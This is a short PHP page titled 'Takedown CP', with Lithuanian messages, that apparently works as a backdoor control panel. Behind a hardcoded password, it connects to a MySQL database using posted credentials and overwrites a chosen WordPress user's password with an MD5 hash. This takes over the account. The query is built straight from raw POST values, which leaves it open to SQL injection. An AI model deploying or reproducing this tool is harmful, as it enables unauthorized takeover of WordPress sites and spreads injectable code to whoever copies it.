<html>
<head>
<title>Takedown CP</title>
</head>

<body>
<?php 

$pass=$_POST['slapt'];

if($pass=="duomenubazes"){
echo "Prisijungta prie CP";
$con=mysql_connect("".$_POST['dbhost']."", "".$_POST['dbuser']."", "".$_POST['dbpass']."");
echo "<br>";
if(!$con){
die("Ivyko klaida prisijungiant prie duomenu bazes:" .mysql_error());

}else{
echo "Prisijungta prie duomenu bazes";
mysql_select_db("".$_POST['dbname']."", $con);

$uzklausa1="UPDATE `".$_POST['dbname']."`.`wp_users` SET `user_pass` = MD5( '".$_POST['pass1']."' ) WHERE `wp_users`.`ID` =".$_POST['user1']." LIMIT 1 ";
echo $DB_NAME;

$rezultatas=mysql_query($uzklausa1);

if($rezultatas){
echo "<p>Uzklausa ivykdyta</p>";
}else
{
echo "<p>Nepavyko ivykdyti uzklausos</p>";
}







}












}
else{
echo "Neautorizuotas prisijungimas";
}





?>





</body>
</html>